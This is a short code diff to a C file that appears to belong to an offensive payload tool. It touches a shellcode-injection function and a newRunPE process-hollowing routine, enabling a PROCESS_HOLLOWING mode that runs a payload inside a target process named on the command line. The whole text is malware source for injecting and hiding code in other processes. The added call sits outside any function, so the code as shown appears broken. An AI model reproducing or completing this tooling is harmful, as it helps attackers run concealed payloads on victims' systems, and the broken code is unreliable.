@@ -267,6 +267,12 @@ DWORD inject_sc_process(unsigned char *shellcode, DWORD pid)
 }
 #endif
 
+#ifdef PROCESS_HOLLOWING
+	// Instanciate target process
+	// Target process specified in first bfg argument argv[1]
+	newRunPE(argv[1], payload);
+#endif
+
 #ifdef IMAGE
 DWORD get_pid_by_name(char *imgname)
 {
@@ -319,7 +325,7 @@ DWORD get_pid_by_name(char *imgname)
 }
 #endif
 
-#ifdef
+#ifdef PROCESS_HOLLOWING
 void newRunPE(LPSTR szFilePath, PVOID pFile)
 {
 	PIMAGE_DOS_HEADER IDH;				// DOS .EXE header
@@ -386,7 +392,7 @@ void newRunPE(LPSTR szFilePath, PVOID pFile)
 				}
 			}
 		}
-VirtualFree(pFile, 0, MEM_RELEASE);
+	VirtualFree(pFile, 0, MEM_RELEASE);
 }
 #endif
 
